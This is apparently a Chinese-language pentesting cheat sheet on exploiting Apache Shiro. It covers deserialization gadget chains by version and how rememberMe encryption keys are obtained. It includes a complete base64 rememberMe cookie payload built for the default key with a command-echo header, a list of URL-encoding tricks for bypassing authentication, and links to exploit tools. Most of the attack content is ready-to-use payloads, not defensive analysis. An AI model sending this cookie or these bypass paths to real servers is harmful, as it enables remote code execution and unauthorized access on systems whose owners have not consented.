## Shiro反序列化
- [Java版payload生成](https://github.com/shadowsock5/Poc/blob/master/Shiro/ShiroDeser.java)
- [Python版payload生成](https://github.com/shadowsock5/Poc/blob/master/Shiro/shiro_deser.py)

### 反序列化利用链
从Shiro-core官方的pom.xml文件中可以看出，在项目通过pom.xml引入shiro-core时，会自动引入commons-beanutils。当shiro-core的版本改变时，CB的版本也会随之改变。通过测试发现，shiro从1.2.4到1.3.2依赖的都是CB-1.8.3。而在shiro-1.3.2的下一个版本1.4.0中依赖的CB是1.9.3，从这个shiro版本开始，引入shiro依赖的项目会依赖CC3.2.2。
参考：
- https://github.com/apache/commons-beanutils/blob/BEANUTILS_1_9_1/pom.xml#L278
- https://github.com/apache/shiro/blob/shiro-root-1.4.0/pom.xml#L832
- https://github.com/apache/shiro/blob/shiro-root-1.3.2/pom.xml
- https://github.com/apache/shiro/blob/shiro-root-1.2.4/pom.xml#L617

### 说明
- 1.2.4的key硬编码在`org\apache\shiro\mgt\AbstractRememberMeManager.java`这个文件里；
- 1.2.4以上（1.2.5开始）的key在AbstractRememberMeManager构造方法里是这样写的：
```java
this.setCipherKey(cipherService.generateNewKey().getEncoded());
```
可以直接调这个接口，这样得到的key就是随机的。当然开发者也可以通过配置文件配置，比如`shiro.ini`, `xxx-shiro-xml`等制定一个自己实现的RememberMeManager（继承自`CookieRememberMeManager`），然后`applications.properties`里面配置这个硬编码的seed。如果攻击者知道了这个seed，可以方便地拿到shiro的key。
- 1.4.2以后，从`CBC`模式变成了`GCM`模式，需要相应地修改一下代码。

#### 默认key的回显payload(CC10)
```
labHeader: ipconfig
Cookie: rememberMe=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
```

## Shiro权限绕过
比如想要访问的敏感url为：
```
/admin/index
```
假设`/static` 路径不需要认证即可访问。

绕过姿势：
- /admin/index%2f
- /;/admin/index
- /static;/admin/index
- /static;/../admin/index
- /static/..;/admin/index
- /admin/index%25%32%46index
- /admin/%3bindex
- /admin/%20 或/admin/%20/
- /admin/%2e 或/admin/%2e/


## 参考
- https://www.cnblogs.com/loong-hon/p/10619616.html
- https://www.codenong.com/cs106643678/
- [Shiro权限验证绕过史](https://s31k31.github.io/2020/08/20/Shiro_Authentication_Bypass/)
- [Shiro反序列化漏洞笔记二（检测篇）](http://xiashang.xyz/2020/09/05/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%AC%94%E8%AE%B0%E4%BA%8C%EF%BC%88%E6%A3%80%E6%B5%8B%E7%AF%87%EF%BC%89/)
- [深入利用Shiro反序列化漏洞](https://xz.aliyun.com/t/8445)
- https://github.com/apache/shiro/blob/8751ce1c31848efa96242099ba908bd110540246/RELEASE-NOTES#L163
- https://github.com/apache/shiro/blob/323698ed6e22e417a5e86e367906cddb29932bbe/crypto/cipher/src/main/java/org/apache/shiro/crypto/cipher/AesCipherService.java
- https://jkme.github.io/cve-2016-6802-exp.html
- [Apache Shiro 两种姿势绕过认证分析（CVE-2020-17523）](https://paper.seebug.org/1478/)
- [tomcat容器url解析特性研究](https://xz.aliyun.com/t/10799)
- [CVE-2022-32532: Apache Shiro: Authentication Bypass Vulnerability](https://seclists.org/oss-sec/2022/q2/215)
- [浅谈Shiro CVE-2022-32532](https://xz.aliyun.com/t/11501)

## Shiro反序列化利用工具
- https://github.com/Ares-X/shiro-exploit
- https://github.com/feihong-cs/ShiroExploit-Deprecated
- https://github.com/wyzxxz/shiro_rce
- https://github.com/pmiaowu/BurpShiroPassiveScan
- https://github.com/potats0/shiroPoc
- https://github.com/fupinglee/ShiroScan
